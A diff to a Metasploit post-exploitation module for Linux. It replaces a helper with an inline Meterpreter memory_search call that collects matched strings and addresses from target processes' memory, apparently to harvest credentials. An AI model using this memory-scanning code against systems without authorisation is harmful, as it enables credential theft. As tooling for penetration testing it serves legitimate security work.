@@ -4,7 +4,6 @@
 ##
 
 require 'unix_crypt'
-require 'metasploit/framework/hashes'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Linux::Priv
@@ -126,8 +125,20 @@ class MetasploitModule < Msf::Post
     target_info['pids'] = target_pids
     target_info['pids'].each_with_index do |target_pid, _ind|
       vprint_status("Searching PID #{target_pid}...")
-      res = mem_search_ascii(5, 500, target_info['needles'], pid: target_pid)
-      target_info['matches'][target_pid] = res.empty? ? nil : res
+      response = session.sys.process.memory_search(pid: target_pid, needles: target_info['needles'], min_match_length: 5, max_match_length: 500)
+
+      matches = []
+      response.each(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_RESULTS) do |res|
+        match_data = {}
+        match_data['match_str'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_STR)
+        match_data['match_offset'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR)
+        match_data['sect_start'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_START_ADDR)
+        match_data['sect_len'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_SECT_LEN)
+
+        matches << match_data
+      end
+
+      target_info['matches'][target_pid] = matches.empty? ? nil : matches
     end
   end
 
